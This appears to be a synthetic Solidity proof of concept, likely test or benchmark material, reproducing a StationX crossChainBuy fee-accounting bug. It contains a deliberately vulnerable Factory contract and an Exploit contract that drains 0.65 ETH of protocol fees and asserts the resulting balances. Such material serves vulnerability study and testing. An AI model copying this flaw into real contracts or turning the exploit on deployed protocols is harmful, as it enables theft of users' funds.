// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  StationX — crossChainBuy pays LayerZero `msg.value - fees` after the deposit
    was already sent from the factory balance (Pashov, Oct 2024).
    SYNTHETIC, cheatcode-free. The factory is pre-funded with 5 ETH of protocol
    fees. A 1 ETH buy forwards the deposit and almost all of msg.value, so the
    factory supplies the shortfall from those fees. The attacker keeps 0.65 ETH. (@> VULN) */

contract CommLayer {
    uint256 public constant LZ_COST = 0.05 ether;

    function sendMsg(address refundTo) external payable {
        require(msg.value >= LZ_COST, "lz");
        uint256 refund = msg.value - LZ_COST; // S4
        (bool ok,) = refundTo.call{value: refund}("");
        require(ok, "refund");
    }
}

contract Factory {
    uint256 public constant FEES = 0.1 ether;
    uint256 public constant DEPOSIT = 0.8 ether;
    CommLayer public comm;

    constructor(CommLayer c) {
        comm = c;
    }

    function crossChainBuy(address dao, address refundTo) external payable {
        require(msg.value >= DEPOSIT, "fees sent");
        (bool ok,) = dao.call{value: DEPOSIT}(""); // S2
        require(ok, "dao");
        uint256 fees = FEES;
        comm.sendMsg{value: msg.value - fees}(refundTo); // @> VULN: S3 value ignores the deposit already paid
    }
}

contract Loot {
    receive() external payable {}
}

contract Exploit {
    CommLayer public comm; // nonce 1
    Factory public factory; // nonce 2
    Loot public loot; // nonce 3

    uint256 public profit;

    constructor() {
        comm = new CommLayer();
        factory = new Factory(comm);
        loot = new Loot();
    }

    receive() external payable {}

    function run() external payable {
        require(msg.value == 1 ether, "capital");
        factory.crossChainBuy{value: msg.value}(address(this), address(this)); // S1
        profit = address(this).balance - msg.value; // S5
        (bool ok,) = address(loot).call{value: profit}(""); // S6
        require(ok, "skim");
        require(profit == 0.65 ether, "stolen fees");
        require(address(factory).balance == 4.3 ether, "factory should have lost 0.7 ETH");
        require(address(comm).balance == 0.05 ether, "lz cost");
        require(address(loot).balance == profit, "loot");
    }
}
